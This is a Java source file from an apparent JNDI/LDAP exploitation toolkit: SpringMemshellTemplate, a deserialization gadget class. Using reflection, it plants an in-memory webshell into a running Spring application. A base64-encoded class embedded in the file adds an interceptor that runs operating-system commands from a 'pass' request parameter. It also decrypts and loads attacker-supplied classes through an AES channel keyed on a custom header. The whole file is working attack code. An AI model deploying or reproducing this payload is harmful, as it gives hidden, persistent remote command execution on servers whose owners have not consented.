package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import sun.misc.BASE64Decoder;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.LinkedHashSet;

public class SpringMemshellTemplate extends AbstractTranslet {

    // 这种方式经过测试，可以兼容到 1.3.0.RELEASE

    public SpringMemshellTemplate(){
        System.out.println("[+] Add Dynamic Interceptor");

        try{
            // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
            Field field = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
            // 2. 属性被 private 修饰，所以 setAccessible true
            field.setAccessible(true);
            // 3. 获取一个 ApplicationContext 实例
            WebApplicationContext context =(WebApplicationContext) ((LinkedHashSet)field.get(null)).iterator().next();

            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>)field.get(abstractHandlerMapping);

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class clazz = null;
            try{
                clazz = classLoader.loadClass("com.feihong.ldap.template.DynamicInterceptorTemplate");
            }catch(ClassNotFoundException e){
                try{
                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    String codeClass = "yv66vgAAADIBTgoAWwCdCACeCQBaAJ8IAKAJAFoAoQgAogkAWgCjCgBaAKQJAKUApggApwoAqACpCACqCwCrAKwIAK0KABMArgoAEwCvCQCwALEIALIHALMIALQIALUIAG4IALYHALcKALgAuQoAuAC6CgC7ALwKABgAvQgAvgoAGAC/CgAYAMALAMEAwgoAwwCpCwCrAMQLAKsAxQgAxgsAqwDHCADICwDJAMoIAMsKAMwAzQcAzgcAzwoAKwCdCwDJANAKACsA0QgA0goAKwDTCgArANQKABMA1QoAKgDWCgDMANcHANgKADUAnQsAqwDZCgDaANsKADUA3AoAzADdCQBaAN4IAN8HAOAHAHMHAOEKAD0A4gcA4woA5ADlCgDkAOYKAOcA6AoAPQDpCADqBwDrBwDsBwDtCgBJAO4IAO8KAD8A8AcA8QgA8gkA8wD0CgDnAPUKAPMA9gcA9woAUgDuBwD4CgBUAO4HAPkKAFYA7gcA+goAWADuBwD7BwD8AQASbXlDbGFzc0xvYWRlckNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBABBiYXNpY0NtZFNoZWxsUHdkAQASTGphdmEvbGFuZy9TdHJpbmc7AQATYmVoaW5kZXJTaGVsbEhlYWRlcgEAEGJlaGluZGVyU2hlbGxQd2QBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEANkxjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL0R5bmFtaWNJbnRlcmNlcHRvclRlbXBsYXRlOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA2NtZAEAAWsBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEAAltCAQAJZXZpbENsYXNzAQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQANU3RhY2tNYXBUYWJsZQcAswcAbAcA7QEACkV4Y2VwdGlvbnMBAAppbml0aWFsaXplAQACZXgBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAARjb2RlAQAFYnl0ZXMBAAZtZXRob2QBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAC1MamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbjsHAPsHAOEHAPEHAP0HAPcHAPgHAPkHAPoBAApTb3VyY2VGaWxlAQAfRHluYW1pY0ludGVyY2VwdG9yVGVtcGxhdGUuamF2YQEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBACtMb3JnL3NwcmluZ2ZyYW1ld29yay9zdGVyZW90eXBlL0NvbnRyb2xsZXI7DABiAGMBAARwYXNzDABeAF8BAAxYLU9wdGlvbnMtQWkMAGAAXwEAEGU0NWUzMjlmZWI1ZDkyNWIMAGEAXwwAhQBjBwD+DAD/AQABACJbK10gRHluYW1pYyBJbnRlcmNlcHRvciBzYXlzIGhlbGxvBwEBDAECAQMBAAR0eXBlBwEEDAEFAQYBAAViYXNpYwwA6gEHDAEIAQkHAQoMAQsAXwEAAS8BABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQACL0MBABFqYXZhL3V0aWwvU2Nhbm5lcgcBDAwBDQEODAEPARAHAREMARIBEwwAYgEUAQACXEEMARUBFgwBFwEYBwEZDAEaARsHARwMAR0BBgwBHgEYAQAEUE9TVAwBHwEgAQABdQcBIQwBIgEjAQADQUVTBwEkDAElASYBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAScBKAwBKQEqAQAADAEpASsMASwBGAwBLQEuDABiAS8MATABMQEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMATIBMwcBNAwBNQEYDAE2ATcMATgBOQwAXABdAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIMAToBOwEAEGphdmEvbGFuZy9PYmplY3QHATwMAT0BPgwBPwFABwD9DAFBAUIMAUMBRAEABmVxdWFscwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAUUAYwEAJ2NvbS5mZWlob25nLmxkYXAudGVtcGxhdGUuTXlDbGFzc0xvYWRlcgwBRgFHAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24BAxx5djY2dmdBQUFESUFHd29BQlFBV0J3QVhDZ0FDQUJZS0FBSUFHQWNBR1FFQUJqeHBibWwwUGdFQUdpaE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFDbE1ZMjl0TDJabGFXaHZibWN2YkdSaGNDOTBaVzF3YkdGMFpTOU5lVU5zWVhOelRHOWhaR1Z5T3dFQUFXTUJBQmRNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU93RUFDMlJsWm1sdVpVTnNZWE56QVFBc0tGdENUR3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2pzcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQkFBVmllWFJsY3dFQUFsdENBUUFMWTJ4aGMzTk1iMkZrWlhJQkFBcFRiM1Z5WTJWR2FXeGxBUUFTVFhsRGJHRnpjMHh2WVdSbGNpNXFZWFpoREFBR0FBY0JBQ2RqYjIwdlptVnBhRzl1Wnk5c1pHRndMM1JsYlhCc1lYUmxMMDE1UTJ4aGMzTk1iMkZrWlhJTUFBOEFHZ0VBRldwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNnRUFGeWhiUWtsSktVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FDRUFBZ0FGQUFBQUFBQUNBQUFBQmdBSEFBRUFDQUFBQURvQUFnQUNBQUFBQmlvcnR3QUJzUUFBQUFJQUNRQUFBQVlBQVFBQUFBUUFDZ0FBQUJZQUFnQUFBQVlBQ3dBTUFBQUFBQUFHQUEwQURnQUJBQWtBRHdBUUFBRUFDQUFBQUVRQUJBQUNBQUFBRUxzQUFsa3J0d0FES2dNcXZyWUFCTEFBQUFBQ0FBa0FBQUFHQUFFQUFBQUlBQW9BQUFBV0FBSUFBQUFRQUJFQUVnQUFBQUFBRUFBVEFBNEFBUUFCQUJRQUFBQUNBQlU9BwFIDAFJAF0MAUoBSwwBTAFNAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24BADRjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL0R5bmFtaWNJbnRlcmNlcHRvclRlbXBsYXRlAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0hhbmRsZXJJbnRlcmNlcHRvckFkYXB0ZXIBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAdpc0VtcHR5AQADKClaAQAMamF2YS9pby9GaWxlAQAJc2VwYXJhdG9yAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEACWdldEhlYWRlcgEACWdldE1ldGhvZAEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmFwcGVuZAEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsAIQBaAFsAAAAEAAIAXABdAAAAAgBeAF8AAAACAGAAXwAAAAIAYQBfAAAAAwABAGIAYwABAGQAAABZAAIAAQAAABsqtwABKhICtQADKhIEtQAFKhIGtQAHKrcACLEAAAACAGUAAAAaAAYAAAAaAAQAFgAKABcAEAAYABYAGwAaABwAZgAAAAwAAQAAABsAZwBoAAAAAQBpAGoAAgBkAAAC0QAHAAoAAAGXsgAJEgq2AAsrEgy5AA0CAMYAkysSDLkADQIAEg62AA+ZAIMrKrQAA7kADQIAOgQZBMYAbxkEtgAQmgBnAToFsgAREhK2AA+ZABsGvQATWQMSFFNZBBIVU1kFGQRTOgWnABgGvQATWQMSFlNZBBIXU1kFGQRTOgW7ABhZuAAZGQW2ABq2ABu3ABwSHbYAHrYAHzoGLLkAIAEAGQa2ACEDrKcA9SsqtAAFuQAiAgDGAOgruQAjAQASJLYAD5kA0Cq0AAc6BCu5ACUBABImGQS5ACcDABIouAApOgUZBQW7ACpZuwArWbcALCu5ACUBABImuQAtAgC2AC4SL7YAMLYAMbYAMhIotwAztgA0GQW7ADVZtwA2K7kANwEAtgA4tgA5tgA6OgYqtAA7EjwFvQA9WQMSPlNZBBI/U7YAQAEFvQBBWQMZBlNZBLgAQrYAQ1O2AETAAD06BxkHtgBFOggZBxJGBb0APVkDEkdTWQQSSFO2AEA6CRkJGQgFvQBBWQMrU1kELFO2AERXA6ynAAo6BBkEtgBKBKwAAQCwAYoBjgBJAAMAZQAAAG4AGwAAACAACAAiACMAJAAvACUAPAAmAD8AJwBKACgAYgAqAHcALACTAC0AngAvAKAAMQCwADQAvgA1AMQANgDTADcA2gA4AQsAOQElADoBVwA7AV4APAF1AD0BiQA/AYsAQwGOAEEBkABCAZUARgBmAAAAjgAOAD8AYQBrAGwABQCTAA0AbQBfAAYALwBxAG4AXwAEAMQAxwBvAF8ABADaALEAcABxAAUBJQBmAHIAcwAGAVcANAB0AF0ABwFeAC0AdQB2AAgBdQAWAHcAeAAJAZAABQB5AHoABAAAAZcAZwBoAAAAAAGXAHsAfAABAAABlwB9AH4AAgAAAZcAfwB2AAMAgAAAABgAB/0AYgcAgQcAghT5ACgC+wDnQgcAgwYAhAAAAAQAAQBJAAIAhQBjAAEAZAAAAeQABwAHAAAAlbgAQrYAQ0wqKxJLtgBMtQA7pwBrTRJOTrsANVm3ADYttgA5OgQBOgUSPxI8Br0APVkDEj5TWQSyAE9TWQWyAE9TtgBAOgUZBQS2AFAqGQUrBr0AQVkDGQRTWQQDuABRU1kFGQS+uABRU7YARMAAPbUAO6cACjoGGQa2AFOnABhMK7YAVacAEEwrtgBXpwAITCu2AFmxAAUABwARABQATQAoAHIAdQBSAAAAfAB/AFQAAAB8AIcAVgAAAHwAjwBYAAMAZQAAAF4AFwAAAEsABwBNABEAWgAUAE4AFQBPABgAUAAlAFIAKABUAEYAVQBMAFYAcgBZAHUAVwB3AFgAfABhAH8AWwCAAFwAhABhAIcAXQCIAF4AjABhAI8AXwCQAGAAlABiAGYAAABmAAoAdwAFAIYAhwAGABgAZACIAF8AAwAlAFcAiQBzAAQAKABUAIoAeAAFABUAZwB5AIsAAgAHAHUAjACNAAEAgAAEAHkAjgABAIgABAB5AI8AAQCQAAQAeQCQAAEAAACVAGcAaAAAAIAAAABFAAf/ABQAAgcAkQcAkgABBwCT/wBgAAYHAJEHAJIHAJMHAIEHAD4HAJQAAQcAlf8ABgABBwCRAABCBwCWRwcAl0cHAJgEAAIAmQAAAAIAmgCbAAAABgABAJwAAA==";
                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    clazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
                }catch (Exception ex){
                    ex.printStackTrace();
                }
            }

            adaptedInterceptors.add(clazz.newInstance());
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
